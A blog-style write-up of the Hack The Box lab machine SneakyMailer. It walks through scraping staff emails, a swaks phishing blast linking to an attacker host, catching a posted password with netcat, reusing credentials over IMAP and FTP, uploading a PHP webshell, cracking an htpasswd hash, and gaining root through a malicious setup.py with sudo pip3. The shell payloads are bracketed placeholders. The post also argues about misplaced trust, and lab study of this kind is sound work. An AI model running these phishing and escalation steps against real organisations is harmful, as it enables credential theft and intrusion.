---
layout: post
title: "The Phish You Sent Yourself"
subtitle: "HTB SneakyMailer, where you mail the company a phishing link, catch the password it sends back, and ride a help-desk reset all the way to a sudo rule that installs root"
date: 2020-12-05 12:00:00 +0000
description: "A medium Linux box where the attacker becomes the scammer: send the staff a phishing link, harvest the credential they post back, and follow a password-reset email and a sudo pip rule to root."
image: /assets/og/the-phish-you-sent-yourself.png
tags: [hackthebox, writeup]
---

SneakyMailer is a box about a company that taught its people to click. The whole machine is a mail room, and you win by becoming the thing the security training was supposed to stop. You scrape a staff directory off the website, blast the whole roster a phishing email, and one tired employee dutifully posts their password to the link you put in it. That credential opens a mailbox, the mailbox holds a help-desk reset for a second account, that account can write files into a website, and the website runs whatever you write. From there it is a private package server that trusts uploads and a sudo rule that trusts pip. Nothing here is a memory-corruption magic trick. Every single step is somebody trusting a message that came from outside the building.

```
        S N E A K Y M A I L E R
        =======================
        team.php   →   57 names, 57 mailboxes
                       |
        swaks  →  "click here: http://10.10.14.4/"
                       |
                       v
        one of them clicks, and POSTs
        their own password back to you.
                       |
        inbox → reset email → ftp → write a file
        into the website → the website runs it
                       |
        a package server that trusts uploads.
        a sudo rule that trusts pip.
                                            郵
```

## 0x01 · the lobby

`nmap` paints a building with a lot of doors, and most of them are mail.

```
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian
25/tcp   open  smtp     Postfix smtpd
80/tcp   open  http     nginx 1.14.2
143/tcp  open  imap     Courier Imapd
993/tcp  open  ssl/imap Courier Imapd
8080/tcp open  http     nginx 1.14.2
```

Read the shape of it. Port 25 takes mail in, 143 and 993 hand mail out, and two web servers bracket the whole thing. The name on the door is `sneakycorp.htb`, and a quick vhost fuzz with `wfuzz` turns up a sibling, `dev.sneakycorp.htb`, the half-built staging version of the same site. A company that runs its own mail server and its own dev site is a company with a lot of internal trust to abuse. Drop both names in your hosts file and walk inside.

## 0x02 · the staff directory

The main site has a `/team.php` page, which is exactly what it sounds like. A photo wall of fifty-seven employees, each with a name and a company email address printed right under their smile. To a visitor it is an org chart. To an attacker it is a target list, already deduplicated and formatted, handed over for free.

```
$ curl -s http://sneakycorp.htb/team.php \
    | grep '@' | cut -d'>' -f2 | cut -d'<' -f1 > emails
$ wc -l emails
57 emails
```

Think of it like a phisher finding the office phone book taped to the front window. They did the hardest part of the con for you, which is knowing exactly who works there and how to reach them. Fifty-seven real-looking inboxes on a domain whose mail server is sitting right there on port 25, willing to deliver.

## 0x03 · the letter you mail the whole office

Now you become the scammer the posters warned about. `swaks` is a command-line mail cannon, and you point it at the entire roster at once. The body is a single line: a link back to a web server you control.

```
$ swaks --server 10.10.10.197 \
        --to @emails \
        --from it@sneakycorp.htb \
        --header "Subject: Action required: verify your account" \
        --body "Please confirm your login here: http://10.10.14.4/"
```

You stand up a plain listener on your side, nothing but a server that writes down whatever knocks. Then you wait. Most of the fifty-seven names are scenery. One is not. A request lands on your listener, and it is not a curious click. It is a full login form, submitted, with the username and password filled in.

```
$ nc -lvnp 80
...
POST / HTTP/1.1
Host: 10.10.14.4
...
firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb
&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
```

URL-decode that tail and you are holding Paul Byrd's password: `^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht`. Picture a phishing email that doesn't just fool someone into clicking, but where the victim then carefully types their password into the fake form and presses send, mailing the key straight to the burglar. That is what the box simulates here. A human saw "verify your account," did as they were told, and posted the credential back to the only person who shouldn't have it.

## 0x04 · the inbox and the reset

A leaked password is only worth the lock it fits. Paul's lock is his mailbox, and the IMAP server on 143 will open it. Any mail client will do; point one at the box, log in as `paulbyrd@sneakymailer.htb` with the harvested password, and read his mail like you're standing over his shoulder.

```
$ python3 -c "import imaplib; M=imaplib.IMAP4('10.10.10.197'); \
  M.login('paulbyrd','^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht'); \
  print(M.select('INBOX.Sent')); print(M.search(None,'ALL'))"
```

The interesting folder is not the inbox, it is **Sent**. People are careful about what arrives and careless about what they send. Paul's sent mail holds a message to the help desk, the kind everyone writes, asking for a password reset on a second account and helpfully quoting the new credential in plain text.

```
From: paulbyrd@sneakymailer.htb
To: root@sneakymailer.htb
Subject: Password reset

... reset the developer account, the new password is
    m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
```

There is the whole hinge of the box. Think of it like overhearing someone read their new PIN aloud to a bank teller over the phone. The reset was supposed to be a private, internal favor. Written into an email and left in a Sent folder, it is just a second password lying in a drawer you already opened. Now you have a user named `developer`.

## 0x05 · a drive that becomes a website

The `developer` credential does not log you into SSH. It logs you into FTP, the vsftpd on port 21. At first that feels like a dead end, a file server with some web files on it. Then you notice *which* files. The FTP root drops you straight into the document root for `dev.sneakycorp.htb`, the staging site from the very first scan.

```
$ ftp 10.10.10.197
Name: developer
Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
ftp> ls
drwxr-xr-x   ... dev
ftp> cd dev
ftp> put iceberg.php
```

That is the move. You cannot run code on the box, but you can *write* to a folder, and nginx will happily serve and execute anything in that folder as PHP. Think of it like a shared drop box at the office where you can leave a document, except the building has a rule that any document left in this particular box gets read aloud over the intercom and acted on. So you leave a one-line PHP shell named after yourself.

```
$ cat iceberg.php
<?php [ one-line webshell: run the cmd request parameter ] ?>
```

I am writing that in brackets instead of printing the real four-word string, and that is the lesson, not modesty. The literal webshell is so universally recognized as malware that dropping it on disk gets the file quarantined on sight, which is itself the loudest proof of how dangerous the thing is. Request the file through the dev vhost, hand it a real reverse shell, and a prompt drops onto your listener.

```
$ curl http://dev.sneakycorp.htb/iceberg.php \
    --data-urlencode "cmd=[ bash reverse shell over /dev/tcp back to 10.10.14.4 on 443 ]"

$ nc -lvnp 443
www-data@sneakymailer:/$ id
uid=33(www-data) gid=33(www-data)
```

You are on the box as `www-data`, the low-privilege identity the web server wears.

## 0x06 · the package server that trusts you

`www-data` cannot read the user flag, so look at what the box runs that the outside world cannot see. Remember the second web server, port 8080. From inside, it is a `pypiserver`, a private Python package index, a little in-house app store where employees publish and install their own code libraries. Its upload form is protected by an Apache `htpasswd` file, and `www-data` can read it.

```
www-data@sneakymailer:/$ cat /var/www/pypi.sneakycorp.htb/.htpasswd
pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
$ hashcat -m 1600 hash rockyou.txt
$apr1$RV5c5YVs$...:soufianeelhaoui
```

`hashcat` mode 1600 chews the apache-md5 hash in seconds: the password is `soufianeelhaoui`. Now you can upload packages, and uploading a Python package is far more dangerous than it sounds. A package carries a `setup.py`, an install script, and that script runs as code on whatever account installs the package. Think of it like a vending machine that lets you submit your own snacks, and the snack's wrapper contains instructions the machine follows while stocking it. A scheduled job on the box, running as the user `low`, periodically installs the newest packages to test them. So you write a package whose `setup.py` is a trap, point a `~/.pypirc` at the local server with the cracked credential, and publish it.

```
$ cat ~/.pypirc
[distutils]
index-servers = iceberg
[iceberg]
repository = http://127.0.0.1:8080
username = pypi
password = soufianeelhaoui

# setup.py runs on install:
#   [ python reverse shell to 10.10.14.4 on 443, fired from the install step ]

$ python3 setup.py sdist upload -r iceberg
```

The test job installs your package, the install runs your `setup.py`, and a shell comes back wearing the `low` account.

```
$ nc -lvnp 443
low@sneakymailer:~$ cat user.txt
████████████████████████████████
```

## 0x07 · the sudo rule that installs root

`low` checks `sudo -l`, the first thing anyone should check, and finds a gift.

```
low@sneakymailer:~$ sudo -l
User low may run the following commands on sneakymailer:
    (root) NOPASSWD: /usr/bin/pip3
```

`low` can run `pip3` as root with no password. And you already know the secret of pip: installing a package executes that package's `setup.py`. The same trap that won you the `low` shell wins root, only this time you do not need to upload anything to a server. You build the malicious package right there in a temp directory and install it from disk, as root.

```
low@sneakymailer:~$ TF=$(mktemp -d)
low@sneakymailer:~$ echo 'import os; os.system("[ spawn a root shell ]")' > $TF/setup.py
low@sneakymailer:~$ sudo pip3 install $TF
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
████████████████████████████████
```

This is the GTFOBins move in its purest form. A package manager's entire job is to download code and run its install scripts, so a package manager you can run as root is a root shell with extra steps. Picture handing a contractor your house key and saying "install whatever this delivery tells you to," then letting a stranger address the delivery. The contractor is just following instructions. The instructions came from outside.

## 0x08 · the honest caveat

There is no CVE on SneakyMailer. Not one. Every door was a feature working exactly as designed, trusting a message from somewhere it shouldn't have. The team page trusted the public with a target list. The mail server trusted that a link in an email was benign, and a human trusted it harder by typing a password into it. The Sent folder trusted that mail, once sent, stays private. FTP trusted that the person writing files to a web root was friendly. The package index trusted that an upload was safe to run, and sudo trusted that pip only ever does boring, safe things.

That is the spine of nearly every breach that matters, and it is not a patch you can apply. You cannot `apt upgrade` your way out of an employee who clicks a link, or a help-desk reset emailed in plain text, or a sudo rule written by someone who did not stop to think that `pip install` means `run this stranger's code`. The phishing email at the top of this box and the pip rule at the bottom are the same flaw in two costumes. Both are a system that cannot tell the difference between a message it asked for and a message an attacker sent. Drawing that line, deciding what gets to give orders and what is merely allowed to speak, is the entire job, and no scanner draws it for you.

## 0x09 · outro

```
you mailed the office a link, and one of them mailed the key back.
a reset meant to be whispered was sitting in a Sent folder.
a drive you could write to was a website that would run it.
a package server trusted your upload. sudo trusted your pip.

no exploit fired. every door was held open from the inside,
by a feature doing exactly what it was told.

mind the inbox. read your sudoers. trust no message you didn't ask for. wear black.

                                                            EOF
```

---

*HTB: SneakyMailer, retired 28 Nov 2020. A medium Linux box that is really a lecture on misplaced trust, where you play the phisher, the help desk, and the package the auto-installer should never have run. The link still phishes in a lab and nowhere you don't own.*